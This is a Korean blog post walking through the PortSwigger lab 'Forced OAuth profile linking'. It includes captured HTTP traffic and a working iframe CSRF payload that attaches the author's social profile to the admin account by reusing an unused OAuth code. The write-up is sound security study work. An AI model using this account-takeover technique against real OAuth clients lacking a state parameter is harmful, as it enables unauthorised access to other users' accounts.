---
layout: post
title: "Burp Academy-OAuth 두번째 문제: Forced OAuth profile linking"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, OAuth취약점]
toc: true
---

# 개요
- OAuth 2.0 관련된 취약점이다. 
- 취약점 설명 주소: https://portswigger.net/web-security/oauth
- 문제 주소: https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking
- 난이도: PRACTITIONER (보통)

# 취약점 설명 : Flawed CSRF protection
- state 파라메터가 CSRF 토큰과 같은 역할을 한다는 내용이다. 
- 만약 클라이언트 어플리케이션에서 OAuth서비스로 인가 코드요청(Authz request)을 보낼 때, state파라메터를 보내지 않으면 보안상 위험하다. (공격자에게는 아주 흥미롭다)
- 구체적으로는 클라이언트 어플리케이션입장에서 인증코드를 전달해준 인가서버가 정상적인 인가서버인지 공격자의 서버인지 (아래 시퀀스도표에서 1번과 3번이 동일한지)를 판단할 수 없다는 것을 의미한다. 

![Authorization code grant type](/images/burp-academy-oauth-grant-type-authorization-code.png)
(출처: https://portswigger.net/web-security/oauth/grant-types)

- 만약 사이트가 OAuth만을 이용해서 로그인을 할 수 있다면 state파라메터는 비교적 덜 중요하다. 그러나 여전히 로그인 CSRF공격은 유효하며, 유저가 공격자가 의도한 계정으로 로그인되도록 만들 수 있다. 


# 문제 개요
- 이 랩에는 ID/PW로그인 혹은 소셜미디어 프로파일을 사용해서 로그인할 수 있는 옵션이 있다. 
- 클라이언트 어플리케이션(웹 사이트)측의 OAuth구현에 취약점이 있기 때문에 공격자는 다른 유저의 계정에 접근할 수 있다. 
- 랩을 풀려면 CSRF 공격을 통해 공격자 자신의 소셜 미디어 프로파일을 웹 사이트 관리자의 계정에 붙여라(attach).
- 관리자 기능을 통해 calros 유저를 삭제하면 문제가 풀린다. 

```
This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete Carlos.

The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts using the following credentials:

Blog website account: wiener:peter
Social media profile: peter.wiener:hotdog
```


# 풀이 
## 웹 사이트의 소셜 미디어(OAuth) 로그인 기능 관찰
이 사이트는 두 가지 방법으로 로그인할 수 있다. 원래 사이트에 있는 계정을 이용해서 로그인하는 방법과 소셜 미디어 계정으로 로그인하는 방법이다. 
소셜 미디어 계정으로 로그인하는 과정을 관찰해본다.

로그인 화면에 Login with social media 버튼이 보인다. 버튼을 클릭한다.   

![로그인화면](/images/burp-academy-oauth-2-1.png)

그러면 다음과 같은 요청이 OAuth 서비스 서버로 전송된다. Authorization code grant type 도표의 1번 Authorization request에 해당하는 부분이다. 이 요청에 `state`파라메터가 없는 것을 확인할 수 있다. 즉, 이 웹 사이트(클라이언트 어플리케이션)는 OAuth 로그인 요청을 시도한 브라우저(사용자)를 구분하지 않는다고 볼 수 있다. 

```http
GET /auth?client_id=dpozpkzpvsq13owpp9aqe&redirect_uri=https://0a4e00fb0337bb8c802f122d00df0026.web-security-academy.net/oauth-login&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0a23008303c0bb6d808710a902ab0091.oauth-server.net
Cookie: _session=D6jfD_djwOo1G9KnJ47F9; _session.legacy=D6jfD_djwOo1G9KnJ47F9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a4e00fb0337bb8c802f122d00df0026.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers


```

요청을 전송하면 OAuth 사이트(xxxx.oauth-server.net)의 소셜 미디어 계정으로 로그인하는 화면으로 이동된다. 여기에 소셜미디어 계정의 ID `peter.wiener` 와 `hotdog`를 입력해서 로그인한다. 

![소셜 미디어 계정 로그인화면](/images/burp-academy-oauth-2-3.png)

로그인에 성공하면 다음과 같이 계속하겠냐는 것을 물어본다. 

![소셜 미디어 계정 로그인성공후](/images/burp-academy-oauth-2-2.png)

Continue를 클릭하면 OAuth 서버로부터 다음과 같은 응답이 돌아온다. 인증에 성공했다는 의미로 `code`파라메터와 함께 클라이언트 어플리케이션(xxx.web-security-academy.net)서버로 리다이렉트(302응답)된다. Authorization code grant type 도표의 3번 Authorization code grant에 해당하는 부분이다. 여기서도 `state`파라메터가 없다. 즉, 이 `code`는 누구라도 사용가능하다. 서버는 구별하지 않는다.


```http
HTTP/2 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://0a4e00fb0337bb8c802f122d00df0026.web-security-academy.net/oauth-login?code=iuhGY_JFQGIlqSEob4WHtFriuIhCVkrXwRW_1Dvj3JO
Content-Type: text/html; charset=utf-8
Set-Cookie: _session=D6jfD_djwOo1G9KnJ47F9; path=/; expires=Wed, 10 May 2023 06:19:44 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=D6jfD_djwOo1G9KnJ47F9; path=/; expires=Wed, 10 May 2023 06:19:44 GMT; secure; httponly
Date: Wed, 26 Apr 2023 06:19:44 GMT
Keep-Alive: timeout=5
Content-Length: 283

Redirecting to <a href="https://0a4e00fb0337bb8c802f122d00df0026.web-security-academy.net/oauth-login?code=iuhGY_JFQGIlqSEob4WHtFriuIhCVkrXwRW_1Dvj3JO">https://0a4e00fb0337bb8c802f122d00df0026.web-security-academy.net/oauth-login?code=iuhGY_JFQGIlqSEob4WHtFriuIhCVkrXwRW_1Dvj3JO</a>.
```

그리고 브라우저는 리다이렉트 지시에 따라 다음과 같은 요청을 클라이언트 어플리케이션 서버로 요청한다. OAuth 인가 코드(`code`파라메터)와 함께 세션 쿠키 `rGlfOYlFMO7MzwcSml1TUfokXGSs4uZl`가 함께 전송된다. 

```http
GET /oauth-login?code=iuhGY_JFQGIlqSEob4WHtFriuIhCVkrXwRW_1Dvj3JO HTTP/2
Host: 0a4e00fb0337bb8c802f122d00df0026.web-security-academy.net
Cookie: session=rGlfOYlFMO7MzwcSml1TUfokXGSs4uZl
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a4e00fb0337bb8c802f122d00df0026.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers


```

그리고 서버는 다음과 같이 소셜 미디어 계정으로 로그인이 성공했다는 응답을 회신한다. 

```http 
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=g1UMuOvtpiGFC2TLkg9iY1nkc1V8uqEL; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 2642

생략...             <p>You have successfully logged in with your social media account</p>
                    <a class=button href='/'>Continue</a>
```

![로그인성공](/images/burp-academy-oauth-2-4.png)


로그아웃 후 다시 로그인해본다. 그러면 소셜 프로필의 유저이름이 peter.wiener로 되어있는 것을 확인할 수 있다. 

![소셜 프로필 확인](/images/burp-academy-oauth-2-6.png)



## 공격 포인트 생각하기 
흐름을 관찰해보니 마지막의 `GET /oauth-login?code=xxxx` 부분이 흥미롭다. 이 요청이 소셜 미디어 프로파일을 이 사이트의 계정에 붙이는(attach)부분으로 보인다. 만약 이 요청을 사이트 관리자가 실행하도록 만들면 (exploit서버에서 이 부분을 시뮬레이션할 수 있다) 관리자로 로그인할 수 있지 않을까? 

## 사용가능한 code 파라메터를 취득하기
다시 로그인을 시도한다. 이 때 `GET /oauth-linking?code=xxx` 요청을 캡쳐한다.  `code`파라메터를 복사해둔다. 그리고 Drop버튼을 클릭한다. `code`는 일회성이므로 서버에 전송해버리면 사용된 코드가 되므로 효력을 상실하기 때문이다. 

![OAuth auth 코드사용부분 캡쳐](/images/burp-academy-oauth-2-7.png)

## exploit서버의 응답을 만들기
이제 exploit서버로 이동한다. Body 부분을 다음과 같이 만든다. iframe의 src에는 현재 문제 서버의 URL을 적는다. code는 위의 과정에서 복사해둔 값이다. 아직 사용하지 않았으니 유효한 코드이다. 

```html
<iframe src="https://0a0600fa042796a682527f9a00e000b1.web-security-academy.net/oauth-linking?code=YxwOMOTCYNP40QDzJcvmte0I7CxyF8m6xqur7-lCTZk"></iframe>
```

deliver exploit to victim 버튼을 클릭한다. 이 것으로 관리자가 이 페이지에 접근하는 것을 시뮬레이션할 수 있다. 

![exploit 서버 페이지 구성](/images/burp-academy-oauth-2-8.png)

그러면 이제 웹 사이트에 다시 소셜 계정으로 로그인해본다. 그러면 웬걸, 관리자로 로그인된 것을 확인할 수 있다! (우측 상단에 Admin Panel 메뉴가 보인다.) 

![관리자 계정으로 로그인](/images/burp-academy-oauth-2-9.png)

Admin Panel 메뉴로 들어가면 유저를 삭제할 수 있다. Carlos 유저를 삭제한다. 그러면 풀이에 성공했다는 메세지가 출력된다. 

![성공](/images/burp-academy-oauth-2-success.png)

# 복기
어떻게 관리자로 로그인할 수 있었는지 다시한번 생각해본다. 

다음과 같은 원리로 생각된다. 

1. 공격자가 자신의 소셜 계정을 이용해 정상적인 OAuth code를 발행한다. 
2. 이 code를 관리자가 사용하도록 만든다. 
3. 그러면 이 code가 관리자의 계정에 붙여진다. (공격자의 소셜 어카운트가 웹 사이트 관리자 계정에 붙여진다)
4. 공격자는 다시 새로운 code를 발행해서 자신의 소셜 어카운트를 사용해 웹 사이트에 로그인한다. 
5. 3번과정에서 공격자의 소셜 어카운트가 웹 사이트 관리자 계정에 붙여졌으므로, 공격자는 웹 사이트 관리자 계정으로 로그인된다. 

위와 같은 공격이 성립하는 것은 다음 전제 조건이 있기 때문에 가능한 것으로 생각된다. 
1. 웹 사이트가 OAuth 인증이외에 별도의 인증(별도의 계정 관리)을 하고 있다. 따라서 OAuth인증결과와 별도 계정을 관련짓는(붙이는) 기능이 존재한다.
2. OAuth 인증시에 state파라메터를 사용하지 않는다. 따라서 OAuth 인증결과로 획득한 인증코드(code파라메터)를 사용한 CSRF공격이 가능하다. 